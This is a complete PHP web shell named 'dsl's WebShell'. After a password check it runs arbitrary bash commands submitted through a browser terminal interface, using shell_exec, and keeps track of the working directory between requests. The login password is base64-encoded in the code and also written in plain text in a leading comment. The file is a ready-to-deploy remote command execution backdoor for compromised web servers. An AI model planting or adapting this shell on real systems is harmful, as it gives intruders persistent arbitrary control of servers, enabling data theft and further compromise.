// pass: nothingissecure

<?php
session_start();

$encoded = "bm90aGluZ2lzc2VjdXJl";
define('PASSWORD', base64_decode($encoded));

if (isset($_POST['password'])) {
    $password_input = trim($_POST['password']);
    if ($password_input === PASSWORD) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Password error!";
    }
}

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    echo "<h1>dsl's WebShell</h1>";
    if (isset($error)) {
        echo "<p style='color:red;'>$error</p>";
    }
    echo '<style>
            body {
                background-color: black;
                color: lightgreen;
                font-family: monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                flex-direction: column;
                text-align: center;
            }
            h1 { color: lightgreen; margin-top: 50px; }
            form {
                background-color: #333;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
                width: 100%;
                max-width: 400px;
                margin-top: 30px;
            }
            form label, form p { color: lightgreen; font-size: 1.2em; }
            form input {
                width: 100%;
                padding: 10px;
                font-size: 1em;
                border: 1px solid #ccc;
                border-radius: 5px;
                margin-bottom: 20px;
            }
            form input[type="password"] { background-color: #f1f1f1; color: #333; }
            form input[type="submit"] {
                background-color: lightgreen;
                border: none;
                color: black;
                font-size: 1.2em;
                cursor: pointer;
            }
            form input[type="submit"]:hover { background-color: #4CAF50; }
          </style>';
    echo '<form method="POST" action="">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <input type="submit" value="Login">
          </form>';
    exit;
}

if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);

    if (!isset($_SESSION['cwd'])) {
        $_SESSION['cwd'] = getcwd();
    }

    if (preg_match('/^cd\s+(.+)/', $cmd, $matches)) {
        $newDir = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $matches[1]);
        if ($newDir && is_dir($newDir)) {
            $_SESSION['cwd'] = $newDir;
        }
        echo $_SESSION['cwd']; 
    } else {
        $output = shell_exec("cd " . escapeshellarg($_SESSION['cwd']) . " && /bin/bash -c " . escapeshellarg($cmd) . " 2>&1");
        echo htmlspecialchars($output); 
    }
    exit;
}

?>

<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>dsl's WebShell</title>
    <style>
        body {
            background-color: black;
            color: lightgreen;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
            text-align: center;
        }

        h1 { color: lightgreen; margin-top: -25px; }
        
        #terminal {
            width: 94%;
            height: 79%;
            overflow-y: auto;
            padding: 13px;
            border: 1px solid lightgreen;
            background-color: #1c1c1c;
            border-radius: 8px;
            text-align: left;
        }

        #cmdline {
            width: 96%;
            background: #1c1c1c;
            color: lightgreen;
            border: none;
            outline: none;
            font-family: monospace;
            font-size: 1.1em;
            padding: 5px;
            margin-top: 2px;
            border-radius: 2px;
        }

        #cmdline:focus { background-color: #333; }

        .command-input {
            display: flex;
            justify-content: flex-start;
            align-items: center;
            width: 90%;
            margin-top: 10px;
        }

        .command-input b { margin-right: 5px; font-size: 1.3em; }

        @media (max-width: 768px) {
            #terminal { width: 95%; }
            #cmdline { width: 95%; }
        }
    </style>
    <script>
        function executarComando() {
            var cmdInput = document.getElementById("cmdline");
            var cmd = cmdInput.value.trim();
            if (cmd === "") return;

            var terminal = document.getElementById("terminal");

            if (cmd.toLowerCase() === "clear") {
                terminal.innerHTML = "";
            } else {
                terminal.innerHTML += "<pre><b>diogo.lourencodev@proton.me $ " + cmd + "</b></pre>";

                var xhr = new XMLHttpRequest();
                xhr.open("POST", "", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4 && xhr.status == 200) {
                        terminal.innerHTML += "<pre>" + xhr.responseText + "</pre>";
                        terminal.scrollTop = terminal.scrollHeight;
                    }
                };
                xhr.send("cmd=" + encodeURIComponent(cmd));
            }

            cmdInput.value = "";
        }

        document.addEventListener("DOMContentLoaded", function() {
            document.getElementById("cmdline").addEventListener("keypress", function(event) {
                if (event.key === "Enter") {
                    executarComando();
                }
            });
        });
    </script>
</head>
<body>
    <h1>dsl's WebShell</h1>
    <div id="terminal"></div>
    <div class="command-input">
        <b>> </b><input type="text" id="cmdline" autofocus>
    </div>
</body>
</html>
